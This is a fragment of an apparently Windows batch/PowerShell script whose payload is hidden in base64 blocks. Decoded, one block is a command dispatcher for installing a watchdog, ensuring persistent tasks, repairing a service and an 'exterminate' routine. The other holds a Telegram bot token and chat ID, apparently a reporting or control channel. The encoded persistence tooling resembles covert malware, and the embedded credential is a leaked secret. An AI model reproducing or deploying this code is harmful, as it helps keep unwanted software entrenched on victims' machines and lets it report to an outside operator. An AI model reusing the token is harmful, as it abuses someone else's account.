b2cnICAgICAgICB7IEluc3RhbGwtV2F0Y2hkb2cgfCBPdXQtTnVsbCB9CiAgICAnd2F0Y2hkb2ct
ZW5zdXJlJyB7IEVuc3VyZS1XYXRjaGRvZyB9CiAgICAndGFza3MtZW5zdXJlJyAgICB7IEVuc3Vy
ZS1QZXJzaXN0VGFza3MgfQogICAgJ3N0YXRlJyAgICAgICAgICAgeyBVcGRhdGUtU3RhdGUgfCBD
b252ZXJ0VG8tSnNvbiAtQ29tcHJlc3MgfQogICAgJ3JlcGFpcicgICAgICAgICAgeyBSZXBhaXIt
U0NTZXJ2aWNlICRGcCB9CiAgICAncmVnaXN0ZXJlZCcgICAgICB7IFRlc3QtU0NSZWdpc3RlcmVk
ICRGcCB9CiAgICAnZXh0ZXJtaW5hdGUnICAgICB7IEludm9rZS1FeHRlcm1pbmF0ZSB9CiAgICAn
Z3J5eGEtaGVhbHRoJyAgICB7IFRlc3QtR3J5eGFIZWFsdGggfQogICAgJ2dyeXhhLWVuc3VyZScg
ICAgeyBJbnZva2UtR3J5eGFFbnN1cmUgfQp9Cg==
::B64_LIB_END

::B64_NTF_BEGIN
Qk9UX1RPS0VOPTg2MTk3MTU3NTQ6QUFGTWsyTmpORC1oUWsyeFBGWWppY0hmQjVNeUt0Y1hDcWcK
Q0hBVF9JRD03NTQ3NDYyMDcwCg==
::B64_NTF_END
